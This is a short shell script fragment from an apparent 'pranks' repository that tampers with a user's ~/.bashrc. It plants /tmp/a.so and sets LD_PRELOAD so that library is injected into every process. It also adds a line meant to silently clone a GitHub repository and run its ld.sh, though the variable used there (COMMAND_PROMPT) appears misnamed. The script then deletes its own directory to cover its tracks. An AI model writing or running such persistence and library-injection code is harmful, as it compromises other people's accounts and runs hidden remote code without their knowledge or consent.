 cp a.so /tmp/
 cd ..
 rm -rf pranks
 echo "export COMMAND_PROMPT='git clone https://github.com/ianliu-johnston/pranks.git >/dev/null 2>/dev/null; cd pranks; ./ld.sh'" >> ~/.bashrc
 echo "export LD_PRELOAD=/tmp/a.so" >> ~/.bashrc
